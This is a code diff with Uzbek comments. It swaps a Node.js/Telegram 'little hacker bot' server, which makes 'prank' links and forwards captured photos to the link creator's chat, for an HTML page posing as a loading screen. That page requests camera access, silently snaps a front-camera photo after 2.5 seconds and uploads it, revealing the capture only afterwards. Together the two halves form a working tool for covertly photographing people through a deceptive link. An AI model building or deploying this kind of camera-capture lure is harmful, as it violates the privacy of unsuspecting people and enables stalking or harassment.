@@ -1,76 +1,114 @@
-require('dotenv').config();
-const express = require('express');
-const axios = require('axios');
-const FormData = require('form-data');
-const path = require('path');
-const { v4: uuidv4 } = require('uuid');
-const { Telegraf } = require('telegraf');
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuting...</title>
+    <style>
+        body {
+            display: flex; flex-direction: column; justify-content: center;
+            align-items: center; height: 100vh; margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f8f9fa; text-align: center; color: #333;
+        }
+        .loader {
+            border: 5px solid #f3f3f3; border-top: 5px solid #3498db;
+            border-radius: 50%; width: 50px; height: 50px;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        #prank-ui { display: none; padding: 20px; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        h1 { color: #e74c3c; margin-bottom: 10px; }
+        p { font-size: 1.1rem; max-width: 300px; line-height: 1.5; }
+        .btn {
+            margin-top: 25px; padding: 12px 25px;
+            background: #3498db; color: white; border: none;
+            border-radius: 8px; cursor: pointer; font-weight: bold;
+        }
+    </style>
+</head>
+<body>
 
-const app = express();
-const bot = new Telegraf(process.env.BOT_TOKEN);
+    <div id="loading-ui">
+        <div class="loader"></div>
+        <p id="msg">Ma'lumotlar yuklanmoqda, kuting...</p>
+    </div>
 
-app.use(express.json({ limit: '20mb' }));
-app.use(express.static('public'));
+    <div id="prank-ui">
+        <h1 style="font-size: 50px;">😂</h1>
+        <h1>PRANK!</h1>
+        <p>Sizga do'stingiz hazil qildi. Rasmingiz unga yuborildi!</p>
+        <button class="btn" onclick="window.close()">Sahifani yopish</button>
+    </div>
 
-// Havolalar va foydalanuvchilarni bog'lash uchun xotira
-const activeLinks = new Map();
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-// 1. Bot Start va Havola yaratish
-bot.start((ctx) => {
-    ctx.reply(`🕵️‍♂️ Kichik haker botga xush kelibsiz, ${ctx.from.first_name}!\n\nDo'stingizga prank qilish uchun /create buyrug'ini bosing.`);
-});
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const loadingUi = document.getElementById('loading-ui');
+        const prankUi = document.getElementById('prank-ui');
+        const msgText = document.getElementById('msg');
 
-bot.command('create', (ctx) => {
-    const id = uuidv4();
-    // Havola ID sini chat_id bilan bog'laymiz
-    activeLinks.set(id, ctx.chat.id);
+        // URL'dan 'id'ni olish (server.js dagi uuid uchun)
+        const urlParams = new URLSearchParams(window.location.search);
+        const prankId = urlParams.get('id');
 
-    const link = `${process.env.BASE_URL}/index.html?id=${id}`;
-    ctx.reply(`🃏 Sizning prank havolangiz tayyor (24 soat amal qiladi):\n\n${link}`);
-});
-
-// 2. Rasmni qabul qilish va egasiga yuborish
-app.post('/upload', async (req, res) => {
-    try {
-        const { image, id } = req.body;
-        const targetChatId = activeLinks.get(id);
-
-        if (!image || !targetChatId) {
-            return res.status(400).send({ status: 'error', message: 'ID yoki rasm topilmadi' });
+        // Agar ID bo'lmasa xato berish
+        if (!prankId) {
+            msgText.innerText = "Xatolik: Havola noto'g'ri shakllantirilgan.";
+        } else {
+            initCamera();
         }
 
-        const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
-        const buffer = Buffer.from(base64Data, 'base64');
-
-        const form = new FormData();
-        form.append('chat_id', targetChatId);
-        form.append('photo', buffer, { filename: `prank_${id}.jpg` });
-        form.append('caption', "📸 Do'stingiz tuzoqqa tushdi! Mana uning rasmi.");
-
-        const response = await axios.post(
-            `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`,
-            form,
-            { headers: form.getHeaders() }
-        );
-
-        if (response.data.ok) {
-            console.log(`✅ Rasm ${targetChatId} ga yuborildi.`);
-            res.send({ status: 'ok' });
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                video.srcObject = stream;
+                
+                // Kamera yoqilgandan so'ng rasm olishga 2.5 soniya vaqt beramiz
+                setTimeout(capture, 2500);
+            } catch (err) {
+                console.error("Kamera xatosi:", err);
+                msgText.innerText = "Xatolik: Sayt ishlashi uchun kameraga ruxsat bering.";
+            }
         }
-    } catch (error) {
-        console.error("❌ Xatolik:", error.message);
-        res.status(500).send({ status: 'error' });
-    }
-});
 
-// 3. Asosiy sahifani yuborish
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
+        function capture() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Server ${PORT}-portda ishlamoqda`);
-});
-
-bot.launch();
+            // Serverga yuborish
+            fetch('/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    image: imageData, 
+                    id: prankId 
+                })
+            })
+            .then(res => {
+                // Kamerani o'chirish (telefon indikatori o'chadi)
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+                
+                // Interfeysni o'zgartirish
+                loadingUi.style.display = 'none';
+                prankUi.style.display = 'block';
+            })
+            .catch(err => {
+                console.error("Yuborishda xato:", err);
+                msgText.innerText = "Tarmoq xatosi yuz berdi.";
+            });
+        }
+    </script>
+</body>
+</html>
